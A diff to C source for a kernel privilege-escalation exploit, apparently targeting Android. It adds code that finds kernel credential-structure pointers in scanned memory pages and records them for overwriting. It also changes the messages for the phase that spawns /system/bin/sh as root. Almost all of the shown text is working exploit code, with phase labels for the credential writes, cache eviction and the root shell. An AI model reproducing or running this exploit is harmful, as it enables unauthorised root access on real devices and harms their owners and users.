@@ -484,12 +484,21 @@ int main(int argc, char **argv) {
                 if (data[i + j] == 0x000007D0) cnt++;
             if (cnt >= 4) { cred_off_found = i * 4; break; }
         }
+
         if (n_comm > 0) {
             printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
                 (unsigned long)va, nz, comm_off);
             task_comm_offs[n_task] = comm_off;
             task_pages[n_task++] = va;
             if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
+
+            uint64_t cred_ptr = (uint64_t)data[CRED_OFF/4] | ((uint64_t)data[CRED_OFF/4 + 1] << 32);
+            if (cred_ptr > 0xffffff8000000000ULL && cred_ptr < 0xffffffffffff0000ULL) {
+                printf("  [CRED_PTR] va=0x%lx cred=0x%lx\n", (unsigned long)va, (unsigned long)cred_ptr);
+                cred_pages[n_cred] = cred_ptr & ~0xfffULL;
+                cred_offs[n_cred] = cred_ptr & 0xfff;
+                n_cred++;
+            }
         }
         if (cred_off_found >= 0 && n_cred < 32) {
             printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
@@ -730,6 +739,8 @@ int main(int argc, char **argv) {
                     cd[31], cd[30], cd[4]);
             }
         }
+    } else {
+        printf("[-] No cred pages found, cannot write\n");
     }
 
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
@@ -742,15 +753,15 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    printf("[*] Phase 9: Spawning root shell (uid=0)...\n");
+    printf("[*] Phase 9: Spawning shell (should be uid=0)\n");
     printf("  current uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
 
     execl("/system/bin/sh", "sh", NULL);
     perror("execl failed");
-    printf("[-] Shell spawn failed, exiting\n");
 
     for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
     while (wait(NULL) > 0);
+    printf("[*] Done.\n");
     return 0;
 }
